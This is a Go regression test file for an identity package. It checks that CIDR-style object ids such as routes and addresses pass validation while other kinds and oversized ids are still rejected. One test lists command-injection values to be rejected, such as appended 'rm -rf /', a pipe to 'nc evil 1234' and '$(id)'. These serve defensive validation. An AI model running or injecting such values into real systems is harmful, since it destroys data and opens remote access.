// Regression tests for B-009 (BETA.2): ObjectKey for
// CIDR-bearing kinds (network.route, network.address,
// etc.) MUST accept '/' in the id so Owner visibility
// does not redact every route and address.
//
// Root cause (pre-fix): the global idPattern in
// policy.go was `^[a-z0-9][a-z0-9._:-]{0,63}$` — no
// '/' and no IPv6 ':' duplication above what letters
// already permit. network.route IDs are CIDR-like
// (10.0.0.0/24, 2001:db8::/64, default) and
// network.address IDs are interface/IP combinations
// (192.168.1.1/24, fe80::1%eth0/64). Every such id
// failed ObjectKey.Valid() → AuthorizeObject returned
// ErrForbidden → the redactor dropped the item from
// the Owner's view.
//
// The fix widens the id pattern ONLY for the CIDR-bearing
// kinds via the cidrKinds map. The global default stays
// strict so adding '/' globally would not weaken every
// other kind's id surface.
package identity

import (
	"strings"
	"testing"

	"github.com/CrazyDuckLab/DuckOS/internal/object"
)

// TestObjectKey_CIDRKinds_AcceptSlash is the canonical
// B-009 regression: every CIDR-bearing kind accepts '/'.
// idGeneration handles IPv4, IPv6, and the IPv6 zone-id
// form.
func TestObjectKey_CIDRKinds_AcceptSlash(t *testing.T) {
	cases := []struct {
		kind string
		id    string
		note  string
	}{
		{"network.route", "10.0.0.0/24", "IPv4 route prefix"},
		{"network.route", "0.0.0.0/0", "default IPv4"},
		{"network.route", "192.168.1.0/24", "private IPv4"},
		{"network.route", "default", "default sentinel"},
		{"network.route", "2001:db8::/64", "IPv6 prefix"},
		{"network.route", "fe80::/64", "link-local IPv6 prefix"},
		{"network.address", "192.168.1.1/24", "host IPv4 + prefix"},
		{"network.address", "fe80::1%eth0/64", "IPv6 link-local with zone id and prefix"},
		{"network.address", "::1/128", "loopback IPv6 + prefix"},
		{"network.firewall.rule", "10.0.0.0/24", "firewall CIDR"},
		{"network.firewall.zone", "10.0.0.0/8", "firewall zone CIDR"},
		{"network.nat.rule", "192.168.0.0/16", "NAT CIDR"},
		{"network.dhcp.reservation", "00:11:22:33:44:55/24", "MAC + prefix (DHCP reservation)"},
	}
	for _, c := range cases {
		k := ObjectKey{Kind: c.kind, ID: c.id}
		if !k.Valid() {
			t.Errorf("%s/%s should be valid (%s)", k.Kind, k.ID, c.note)
		}
	}
}

// TestObjectKey_NonCIDRKinds_StillRejectSlash guards
// against the fix accidentally widening the global
// default. Kinds that should NOT see a '/' must still
// reject it.
func TestObjectKey_NonCIDRKinds_StillRejectSlash(t *testing.T) {
	cases := []ObjectKey{
		{Kind: "vlan", ID: "10.0.0.0/24"},                       // vlan id is "vlan-N"
		{Kind: "wireguard.peer", ID: "peer/with/slash"},         // peer id is opaque
		{Kind: "xray.server", ID: "xray-server/edge"},           // xray server id is opaque
		{Kind: "frr.bgp", ID: "65001/2"},                         // ASN form does not contain '/'
		{Kind: "qos.class", ID: "gold/vip"},                      // qos class id is opaque
		{Kind: "interface", ID: "eth0/wrong"},                   // interface tags are opaque
	}
	for _, k := range cases {
		if k.Valid() {
			t.Errorf("%s/%s must be rejected (kind does not allow '/')", k.Kind, k.ID)
		}
	}
}

// TestObjectKey_RejectsShellMetasInCIDR guards the
// wider pattern against shell metacharacters and
// whitespace smuggling. The wider pattern allows CIDR
// bytes but every metacharacter that could matter to
// a shell exec or a URL parser must still be rejected.
func TestObjectKey_RejectsShellMetasInCIDR(t *testing.T) {
	cases := []string{
		"10.0.0.0/24;rm -rf /",
		"10.0.0.0/24 && echo x",
		"10.0.0.0/24|nc evil 1234",
		"10.0.0.0/24`id`",
		"10.0.0.0/24$(id)",
		"10.0.0.0/24\nGET /evil",
		"10.0.0.0/24\tail",
		"10.0.0.0/24*",
		"10.0.0.0/24?",
		"10.0.0.0/24[",
		"10.0.0.0/24]",
		"10.0.0.0/24{",
		"10.0.0.0/24}",
		"10.0.0.0/24\\",
		"10.0.0.0/24\"",
		"10.0.0.0/24'",
		"10.0.0.0/24<",
		"10.0.0.0/24>",
		"",
		" ",
	}
	for _, id := range cases {
		k := ObjectKey{Kind: "network.route", ID: id}
		if k.Valid() {
			t.Errorf("network.route/%q must be rejected", id)
		}
	}
}

// TestObjectKey_RejectsOversizedCIDR caps id length at
// 96 bytes (the cidrIDPattern ceiling). A runaway id
// (e.g. 2001:db8::/<200 char>) is rejected at the
// pattern level so downstream stores do not need to.
func TestObjectKey_RejectsOversizedCIDR(t *testing.T) {
	// 96 char ceiling
	body := strings.Repeat("a", 97)
	k := ObjectKey{Kind: "network.route", ID: body + "/24"}
	if k.Valid() {
		t.Fatalf("oversized cid id was accepted (len=%d)", len(k.ID))
	}
}

// TestPolicy_OwnerSeesCIDRRoute is the end-to-end
// B-009 regression: an Owner role looking at a
// /api/v1/objects?collection=network.route collection
// must see a route whose id contains '/'. The
// redactor must NOT drop it.
func TestPolicy_OwnerSeesCIDRRoute(t *testing.T) {
	p := NewPolicy()
	col := object.Collection{
		SnapshotID: "snap-1",
		Items: []object.ViewObject{
			{Ref: object.ObjectRef{Kind: "network.route", ID: "10.0.0.0/24"}},
			{Ref: object.ObjectRef{Kind: "network.route", ID: "0.0.0.0/0"}},
			{Ref: object.ObjectRef{Kind: "network.route", ID: "2001:db8::/64"}},
			{Ref: object.ObjectRef{Kind: "network.route", ID: "default"}},
		},
	}
	out := p.FilterCollection(Owner, "network.route", Observe, col)
	if len(out.Items) != 4 {
		t.Fatalf("Owner must see all 4 CIDR routes; got %d (issues=%+v)", len(out.Items), out.Issues)
	}
	for _, it := range out.Items {
		if !strings.Contains(it.Ref.ID, "/") && it.Ref.ID != "default" {
			t.Errorf("unexpected id survived the redactor: %q", it.Ref.ID)
		}
	}
}

// TestPolicy_OwnerSeesCIDRAddress proves the same fix
// covers address kind.
func TestPolicy_OwnerSeesCIDRAddress(t *testing.T) {
	p := NewPolicy()
	col := object.Collection{
		SnapshotID: "snap-2",
		Items: []object.ViewObject{
			{Ref: object.ObjectRef{Kind: "network.address", ID: "192.168.1.1/24"}},
			{Ref: object.ObjectRef{Kind: "network.address", ID: "fe80::1%eth0/64"}},
		},
	}
	out := p.FilterCollection(Owner, "network.address", Observe, col)
	if len(out.Items) != 2 {
		t.Fatalf("Owner must see both CIDR addresses; got %d (issues=%+v)", len(out.Items), out.Issues)
	}
}

// TestPolicy_GrantCIDRKind verifies that a per-object
// overlay (kind-wide '*') still works for CIDR kinds
// — the wildcard is part of both id patterns.
func TestPolicy_GrantCIDRKind(t *testing.T) {
	p := NewPolicy()
	g := Grant{
		Role:       Helpdesk,
		Object:     ObjectKey{Kind: "network.route", ID: "*"},
		Permission: Observe,
		Decision:   DecisionAllow,
		Reason:     "B-009 overlay test",
	}
	if err := p.Set(g); err != nil {
		t.Fatalf("Set: %v", err)
	}
	if err := p.AuthorizeObject(Helpdesk, ObjectKey{Kind: "network.route", ID: "10.0.0.0/24"}, Observe); err != nil {
		t.Fatalf("wildcard overlay must authorise Helpdesk on CIDR route: %v", err)
	}
}

// TestCIDRKinds_AreExhaustively registered asserts every
// kind in cidrKinds is documented at the package level
// (the per-kind decision is deliberate, code-reviewed).
// Adding a kind without updating the test or the
// surrounding comment must be caught.
func TestCIDRKinds_AreExhaustivelyRegistered(t *testing.T) {
	want := []string{
		"network.route",
		"network.address",
		"network.firewall.rule",
		"network.firewall.zone",
		"network.nat.rule",
		"network.dhcp.reservation",
	}
	for _, k := range want {
		if _, ok := cidrKinds[k]; !ok {
			t.Errorf("cidrKinds missing %q", k)
		}
	}
	if len(cidrKinds) != len(want) {
		t.Errorf("cidrKinds has %d entries, want %d (extra kinds must be added to the test list)", len(cidrKinds), len(want))
	}
}

// TestIDPatternForKind_GlobalDefaultIsStrict is the
// safety net: a kind the registry does not know must
// fall back to the strict idPattern (no '/').
func TestIDPatternForKind_GlobalDefaultIsStrict(t *testing.T) {
	if got := idPatternForKind("vlan"); got != idPattern {
		t.Fatalf("unknown kind must fall back to idPattern")
	}
	if got := idPatternForKind("network.route"); got != cidrIDPattern {
		t.Fatalf("network.route must use cidrIDPattern")
	}
}